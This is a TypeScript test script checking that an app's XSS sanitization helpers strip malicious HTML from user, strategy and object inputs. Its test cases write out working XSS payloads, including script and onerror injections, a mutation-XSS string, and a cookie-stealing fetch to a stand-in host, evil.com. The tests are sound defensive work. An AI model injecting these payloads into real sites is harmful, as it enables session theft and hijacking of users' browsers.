#!/usr/bin/env tsx
/**
 * Manual test runner for XSS sanitization
 * Run with: tsx scripts/test-sanitization.ts
 */

import {
  sanitizeInput,
  sanitizeObject,
  sanitizeArray,
  sanitizeUserInput,
  sanitizeStrategyInput,
  sanitizeBacktestInput,
} from '../server/lib/sanitization';

console.log('========================================');
console.log('XSS SANITIZATION TEST SUITE');
console.log('========================================\n');

let passed = 0;
let failed = 0;

function test(description: string, fn: () => void) {
  try {
    fn();
    console.log(`✓ ${description}`);
    passed++;
  } catch (error) {
    console.log(`✗ ${description}`);
    console.log(`  Error: ${error instanceof Error ? error.message : String(error)}`);
    failed++;
  }
}

function expect(actual: any) {
  return {
    toBe(expected: any) {
      if (actual !== expected) {
        throw new Error(`Expected "${expected}" but got "${actual}"`);
      }
    },
    toEqual(expected: any) {
      const actualStr = JSON.stringify(actual);
      const expectedStr = JSON.stringify(expected);
      if (actualStr !== expectedStr) {
        throw new Error(`Expected ${expectedStr} but got ${actualStr}`);
      }
    },
    not: {
      toContain(substring: string) {
        if (String(actual).includes(substring)) {
          throw new Error(`Expected not to contain "${substring}" but found it in "${actual}"`);
        }
      }
    }
  };
}

// ============================================================================
// BASIC SANITIZATION TESTS
// ============================================================================

console.log('Basic Sanitization Tests\n');

test('should remove script tags', () => {
  const malicious = '<script>alert("XSS")</script>';
  const result = sanitizeInput(malicious);
  expect(result).toBe('');
});

test('should remove img tags with onerror', () => {
  const malicious = '<img src=x onerror=alert(1)>';
  const result = sanitizeInput(malicious);
  expect(result).toBe('');
});

test('should preserve normal text', () => {
  const normal = 'Normal text';
  const result = sanitizeInput(normal);
  expect(result).toBe('Normal text');
});

test('should remove HTML tags but keep text content', () => {
  const html = 'Text with <b>bold</b> and <i>italic</i>';
  const result = sanitizeInput(html);
  expect(result).toBe('Text with bold and italic');
});

test('should handle iframe injection', () => {
  const malicious = '<iframe src="javascript:alert(1)"></iframe>';
  const result = sanitizeInput(malicious);
  expect(result).toBe('');
});

test('should handle svg with script', () => {
  const malicious = '<svg onload=alert(1)>';
  const result = sanitizeInput(malicious);
  expect(result).toBe('');
});

test('should handle javascript: protocol', () => {
  const malicious = '<a href="javascript:alert(1)">Click</a>';
  const result = sanitizeInput(malicious);
  expect(result).toBe('Click');
});

test('should handle event handlers', () => {
  const malicious = '<div onclick="alert(1)">Click</div>';
  const result = sanitizeInput(malicious);
  expect(result).not.toContain('onclick');
  expect(result).not.toContain('alert');
});

test('should handle mixed case attacks', () => {
  const malicious = '<ScRiPt>alert(1)</sCrIpT>';
  const result = sanitizeInput(malicious);
  expect(result).toBe('');
});

// ============================================================================
// OBJECT SANITIZATION TESTS
// ============================================================================

console.log('\nObject Sanitization Tests\n');

test('should sanitize all string properties in object', () => {
  const obj = {
    name: '<script>alert(1)</script>Name',
    description: '<img src=x onerror=alert(1)>',
    normal: 'Normal text',
  };
  const result = sanitizeObject(obj);
  expect(result.name).toBe('Name');
  expect(result.description).toBe('');
  expect(result.normal).toBe('Normal text');
});

test('should handle nested objects', () => {
  const obj = {
    user: {
      name: '<script>alert(1)</script>',
      email: 'test@example.com',
    },
  };
  const result = sanitizeObject(obj);
  expect(result.user.name).toBe('');
  expect(result.user.email).toBe('test@example.com');
});

test('should handle arrays of strings', () => {
  const obj = {
    tags: ['<script>tag1</script>', 'normal tag', '<img src=x>'],
  };
  const result = sanitizeObject(obj);
  // Note: DOMPurify strips the entire <script> tag including content
  expect(result.tags).toEqual(['', 'normal tag', '']);
});

// ============================================================================
// ARRAY SANITIZATION TESTS
// ============================================================================

console.log('\nArray Sanitization Tests\n');

test('should sanitize all strings in array', () => {
  const arr = [
    '<script>alert(1)</script>',
    'Normal text',
    '<img src=x onerror=alert(1)>',
  ];
  const result = sanitizeArray(arr);
  expect(result).toEqual(['', 'Normal text', '']);
});

// ============================================================================
// USER INPUT SANITIZATION TESTS
// ============================================================================

console.log('\nUser Input Sanitization Tests\n');

test('should sanitize username', () => {
  const user = {
    username: '<script>alert(1)</script>admin',
    password: 'password123',
  };
  const result = sanitizeUserInput(user);
  expect(result.username).toBe('admin');
  expect(result.password).toBe('password123');
});

test('should sanitize email', () => {
  const user = {
    email: '<script>test@example.com</script>',
  };
  const result = sanitizeUserInput(user);
  // Note: DOMPurify strips the entire <script> tag including content
  expect(result.email).toBe('');
});

// ============================================================================
// STRATEGY INPUT SANITIZATION TESTS
// ============================================================================

console.log('\nStrategy Input Sanitization Tests\n');

test('should sanitize strategy name', () => {
  const strategy = {
    name: '<script>alert(1)</script>My Strategy',
    description: '<img src=x onerror=alert(1)>Great strategy',
  };
  const result = sanitizeStrategyInput(strategy);
  expect(result.name).toBe('My Strategy');
  expect(result.description).toBe('Great strategy');
});

test('should sanitize notes', () => {
  const strategy = {
    notes: '<iframe src="evil.com"></iframe>Important notes',
  };
  const result = sanitizeStrategyInput(strategy);
  expect(result.notes).toBe('Important notes');
});

// ============================================================================
// REAL-WORLD ATTACK SCENARIOS
// ============================================================================

console.log('\nReal-World Attack Scenarios\n');

test('should prevent session stealing via username', () => {
  const maliciousUsername = '<script>fetch("evil.com/steal?cookie="+document.cookie)</script>';
  const result = sanitizeInput(maliciousUsername);
  expect(result).toBe('');
  expect(result).not.toContain('script');
  expect(result).not.toContain('fetch');
});

test('should prevent DOM-based XSS in strategy name', () => {
  const maliciousName = '"><script>document.location="http://evil.com"</script>';
  const result = sanitizeInput(maliciousName);
  expect(result).not.toContain('script');
});

test('should prevent XSS in description fields', () => {
  const maliciousDesc = '<svg/onload=alert(document.cookie)>';
  const result = sanitizeInput(maliciousDesc);
  expect(result).toBe('');
  expect(result).not.toContain('onload');
  expect(result).not.toContain('alert');
});

test('should prevent mutation XSS (mXSS)', () => {
  const mxss = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
  const result = sanitizeInput(mxss);
  expect(result).not.toContain('onerror');
  expect(result).not.toContain('img');
});

// ============================================================================
// EDGE CASES
// ============================================================================

console.log('\nEdge Cases\n');

test('should handle empty strings', () => {
  expect(sanitizeInput('')).toBe('');
});

test('should handle unicode characters', () => {
  const unicode = 'Hello 世界 🌍';
  const result = sanitizeInput(unicode);
  expect(result).toBe(unicode);
});

// ============================================================================
// RESULTS
// ============================================================================

console.log('\n========================================');
console.log('TEST RESULTS');
console.log('========================================');
console.log(`✓ Passed: ${passed}`);
console.log(`✗ Failed: ${failed}`);
console.log(`Total: ${passed + failed}`);

if (failed > 0) {
  console.log('\n⚠️  Some tests failed!');
  process.exit(1);
} else {
  console.log('\n✓ All tests passed!');
  process.exit(0);
}
